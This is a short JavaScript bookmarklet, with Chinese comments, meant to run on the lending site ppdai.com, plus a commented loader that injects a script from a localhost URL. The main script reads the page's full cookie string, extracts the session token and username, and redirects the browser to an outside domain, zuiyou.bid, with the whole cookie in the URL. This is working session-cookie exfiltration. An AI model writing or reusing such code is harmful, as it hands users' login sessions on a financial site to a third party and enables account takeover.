(function() {
    // 判断当前域名
    var domain = 'ppdai.com';
    if (document.domain.indexOf(domain) == -1) {
        alert('请在拍拍贷网页操作');
        window.location.href = 'http://' + domain;
        return;
    }
    try {
        // 判断ppd是否登陆
        var cookie = document.cookie;
        var token = cookie.match(/token=(\S*);/)[1];
        var pdu = cookie.match(/ppd_uname=(\S*);/)[1];
        // 获取cookie跳转到zuiyou
        window.location.href = 'https://zuiyou.bid?token=' + cookie + '&pdu=' + pdu;
    } catch (e) {
        alert('请登录拍拍贷后操作');
    }
})();


// 引入js文件
// javascript: void((function() {var element = document.createElement('script');element.id = 'outfox_seed_js';element.charset = 'utf-8',element.setAttribute('src', 'http://localhost/assets/js/bind.js?' + Date.parse(new Date()));document.body.appendChild(element);})())